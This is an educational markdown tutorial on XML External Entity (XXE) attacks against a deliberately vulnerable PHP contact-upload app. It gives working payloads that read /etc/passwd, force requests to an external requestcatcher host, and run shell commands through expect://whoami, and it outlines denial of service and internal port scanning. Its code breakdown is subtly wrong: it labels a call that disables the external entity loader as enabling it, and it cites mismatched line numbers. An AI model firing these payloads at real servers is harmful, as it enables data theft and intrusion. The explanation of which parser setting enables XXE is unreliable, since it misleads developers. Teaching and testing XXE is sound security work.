# XML external entities (XXE)
An XML External Entity attack is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser.

## Severity

High

## Impact

Defining custom entities by the attacker which leads to performing malicious actions

### Examples

  * Disclosure of confidential data
  * Denial of service
  * Server side request forgery
  * Internal port scanning
  * [Command injection](Command_injection.md)

# How it works?

we will demonstrate a simple example from a web app that lets you upload your contacts in XML format.

## let's see our back-end code:

[file.php](file.php)

## Walkthrough

In this scenario the user should upload the XML file containing his contact info and the application is going to parse it and show `name : number` pairs.

![](xxewalk.png)

The uploaded XML file in this screenshot is this one :
```xml
<contacts>
<name>3la2</name>
<num>123456</num>
<name>amgad</name>
<num>456789</num>
</contacts>
```

## Exploitation

The attacker can manipulate this XML parser because it's configured in a bad way which allows external entities declaration .
An example file which an attacker can use in this case to read internal files from the server is this one :
```XML
<?xml version="1.0"?><!DOCTYPE contacts[<!ENTITY foo SYSTEM "file:///etc/passwd">]>
<contacts>
<name>&foo;</name>
<num>123456</num>
<name>amgad</name>
<num>456789</num>
</contacts>
```
When the attacker uploads this file the content of `/etc/passwd` will be considered the name of the number 123456 owner and get printed into the application HTML .

![](xxe.png)

### Code breakdown

In this vulnerable code :
```php
<?php
#reading file
$myfile = fopen($target_file, "r") or die("Unable to open file!");
$xml= fread($myfile,filesize($target_file));

#parsing XML
$doc = simplexml_load_string($xml);
$oldValue = libxml_disable_entity_loader(true); #enabling external entities
$doc = simplexml_load_string($xml);
libxml_disable_entity_loader($oldValue);

#returning parsed data
$doc = simplexml_load_string($xml, null, LIBXML_NOENT);
?>
```
The developer enabled external entities declaration on lines 8 and 10 which gave the ability of getting values from outside the XML files and user it as entities .

### Payload breakdown

the payload is :
```XML
<?xml version="1.0"?><!DOCTYPE contacts[<!ENTITY foo SYSTEM "file:///etc/passwd">]>
<contacts>
<name>&foo;</name>
<num>123456</num>
<name>amgad</name>
<num>456789</num>
</contacts>
```
* 1st part : ``` <?xml version="1.0"?>```
Declaring used XML version .

* 2nd part : ``` <!DOCTYPE contacts[ ``` Defining that the root element of the document is `contacts` .

* 3rd part : ```<!ENTITY foo``` Declaring an entity called `foo` .

* 4th part : ```SYSTEM "file:///etc/passwd"``` The `system` command is used to declare external entities (from outside the xml document) and it takes a URL as its input .

* 5th part : ```<name>&foo;</name>``` Calling the pre-defined entity which has the content of `/etc/passwd` .

## Further Exploitation

_1. Denial of service (DOS) :_
If the application doesn't return any data back to the user you can still check for XXE by calling `/dev/random` filestream, that'll cause the page to keep loading without stopping. On some server this may cause DOS .

_2. Server side request forgery (SSRF) :_ The attacker can achieve SSRF by making the input to `system` command an external URL, for example :
  ```XML
  <?xml version="1.0"?><!DOCTYPE contacts[<!ENTITY foo SYSTEM "http://root3la2.requestcatcher.com/test">]>
  <contacts>
  <name>&foo;</name>
  <num>123456</num>
  <name>amgad</name>
  <num>456789</num>
  </contacts>
  ```
  You can check it by visiting this URL : `http://root3la2.requestcatcher.com/` .

_3. Internal port scanning :_
The attacker can scan internal network by making a script that requests `internalIP:port` instead of external IP in the previous example, this may lead to taking over the server machine or any other machine on the server network .

_4. Command injection :_ If we are lucky enough and the PHP "expect" module is loaded we can execute shell commands directly using a payload like this :

```XML
<?xml version="1.0"?><!DOCTYPE contacts[<!ENTITY foo SYSTEM "expect://whoami">]>
<contacts>
<name>&foo;</name>
<num>123456</num>
<name>amgad</name>
<num>456789</num>
</contacts>
```
